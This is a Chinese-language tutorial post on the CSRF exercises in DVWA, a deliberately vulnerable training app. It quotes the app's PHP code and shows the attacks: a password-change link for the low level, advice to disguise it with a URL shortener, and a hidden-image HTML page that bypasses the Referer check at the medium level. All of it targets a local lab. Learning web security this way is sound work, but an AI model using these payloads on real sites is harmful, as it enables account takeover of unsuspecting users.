---
title: DVWA之CSRF
date: 2019-3-19
tags: DVWA
categories: DVWA

---

- CSRF，全称Cross-site request forgery，就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），引导诱骗用户点击存在恶意代码的页面，在受害人不知情的情况下利用受害者的身份向服务器发送请求，从而完成非法操作。

- CSRF产生的本质原因：HTTP是无状态协议。前后两个请求无法相互标识，保持状态，各个请求之间是相互独立的。

**1. low 没有任何防御措施，可以直接进行攻击**

```
 if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match? 
```
_从源代码可以看出，只检查了是否是GET请求_

**攻击方法：直接链接访问即可修改密码**

`http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=admin1&password_conf=admin1&Change=Change#`

**如果觉得这样太明显可以百度`短链接生成器` ，从而将这个链接做成一个看不出意图的短链接**

**2. medium**
```
if( isset( $_GET[ 'Change' ] ) ) {
    // Checks to see where the request came from
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
        // Get input
        $pass_new  = $_GET[ 'password_new' ];
        $pass_conf = $_GET[ 'password_conf' ];

        // Do the passwords match? 
```
_从源代码可以看出检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否含有SERVER-NAME（本地是127.0.0.1）
_

**攻击方法:绕过referer.通过burp测试出refere检查的是必须要来自127.0.0.1。所以构造这样一个html文件，放在和dvwa同一个服务器下，再诱使用户访问即可。**

```
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CSRF</title>
</head>
<body>
<img src="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=1234567&password_conf=1234567&Change=Change#" border="0" style="display:none;"/>
<h1>Hello<h1>
<h2>Your password has been changed.<h2>
</body>
</html>
```
